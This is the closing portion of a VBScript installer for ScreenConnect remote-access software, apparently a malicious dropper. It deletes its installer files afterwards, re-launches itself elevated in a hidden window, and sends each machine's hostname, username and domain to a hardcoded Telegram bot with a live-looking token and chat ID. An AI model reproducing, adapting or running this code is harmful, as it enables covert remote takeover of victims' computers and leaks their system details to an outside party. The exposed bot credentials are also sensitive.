                    End If
                End If
            Next
        End If
    Next
    
    Set oReg = Nothing
    On Error GoTo 0
End Function

'==========================================================================
' FINAL CLEANUP
'==========================================================================
Sub FinalCleanup()
    On Error Resume Next
    
    If oFSO.FileExists(sMsiPath) Then
        oFSO.DeleteFile sMsiPath, True
        LogMessage "[CLEANUP] MSI file deleted."
    End If
    
    Dim oFolder, oFile
    If oFSO.FolderExists(sTempDir) Then
        Set oFolder = oFSO.GetFolder(sTempDir)
        For Each oFile In oFolder.Files
            If LCase(oFSO.GetExtensionName(oFile.Name)) = "msi" Then
                If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
                   InStr(1, oFile.Name, "ConnectWise", vbTextCompare) > 0 Or _
                   InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
                    oFSO.DeleteFile oFile.Path, True
                    LogMessage "[CLEANUP] Deleted leftover MSI: " & oFile.Name
                End If
            End If
        Next
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' CLEANUP OLD LOGS
'==========================================================================
Sub CleanupOldLogs(nKeepCount)
    On Error Resume Next
    Dim oFolder, oFile, aLogFiles(), nCount, i
    
    If Not oFSO.FolderExists(sTempDir) Then Exit Sub
    
    Set oFolder = oFSO.GetFolder(sTempDir)
    nCount = 0
    
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect_Install", vbTextCompare) > 0 Then
            ReDim Preserve aLogFiles(nCount)
            Set aLogFiles(nCount) = oFile
            nCount = nCount + 1
        End If
    Next
    
    If nCount > nKeepCount Then
        For i = 0 To nCount - nKeepCount - 1
            aLogFiles(i).Delete True
        Next
    End If
    
    On Error GoTo 0
End Sub

'==========================================================================
' TELEGRAM NOTIFICATION
'==========================================================================
Sub SendTelegramNotification(sStatus)
    On Error Resume Next
    
    Dim sHostname, sUser, sDomain, sMessage, sURL, oHTTP
    
    sHostname = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    sUser     = oShell.ExpandEnvironmentStrings("%USERNAME%")
    sDomain   = oShell.ExpandEnvironmentStrings("%USERDOMAIN%")
    
    sMessage = "[ScreenConnect Installer] " & sStatus & "%0A" & _
               "Computer: " & sHostname & "%0A" & _
               "User: " & sUser & "%0A" & _
               "Domain: " & sDomain & "%0A" & _
               "Time: " & FormatDateTime(Now, 0)
    
    sURL = "https://api.telegram.org/bot8965363679:AAGocjU08VVR4ktDaAFm8aOceU9AcetYBn4/sendMessage?chat_id=6341146460&text=" & sMessage
    
    Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set oHTTP = CreateObject("Microsoft.XMLHTTP")
    End If
    
    oHTTP.Open "GET", sURL, False
    oHTTP.Send
    
    If oHTTP.Status = 200 Then
        LogMessage "[TELEGRAM] Notification sent: " & sStatus
    Else
        LogMessage "[TELEGRAM] Failed to send notification."
    End If
    
    Set oHTTP = Nothing
    On Error GoTo 0
End Sub

'==========================================================================
' HELPER FUNCTIONS
'==========================================================================
Function IsScriptElevated()
    IsScriptElevated = False
    On Error Resume Next
    Dim sTestFile
    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test_admin.tmp"
    oFSO.CreateTextFile(sTestFile).Close
    If Err.Number = 0 Then
        oFSO.DeleteFile sTestFile
        IsScriptElevated = True
    End If
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
End Sub

Sub LogMessage(sMessage)
    On Error Resume Next
    Dim oLogFile
    Set oLogFile = oFSO.OpenTextFile(sLogFile, 8, True)
    If Err.Number = 0 Then
        oLogFile.WriteLine FormatDateTime(Now, 0) & " | " & sMessage
        oLogFile.Close
    End If
    On Error GoTo 0
End Sub

Function GetHiveName(lHive)
    Select Case lHive
        Case &H80000002: GetHiveName = "HKLM"
        Case &H80000001: GetHiveName = "HKCU"
        Case Else:        GetHiveName = "UNKNOWN"
    End Select
End Function

Function FormatFileSize(nBytes)
    If nBytes < 1024 Then
        FormatFileSize = nBytes & " B"
    ElseIf nBytes < 1048576 Then
        FormatFileSize = Round(nBytes / 1024, 2) & " KB"
    ElseIf nBytes < 1073741824 Then
        FormatFileSize = Round(nBytes / 1048576, 2) & " MB"
    Else
        FormatFileSize = Round(nBytes / 1073741824, 2) & " GB"
    End If
End Function

Function FormatDateForFile(dtDate)
    FormatDateForFile = Year(dtDate) & Right("0" & Month(dtDate), 2) & _
                        Right("0" & Day(dtDate), 2) & "_" & _
                        Right("0" & Hour(dtDate), 2) & _
                        Right("0" & Minute(dtDate), 2) & _
                        Right("0" & Second(dtDate), 2)
End Function

WScript.Quit(0)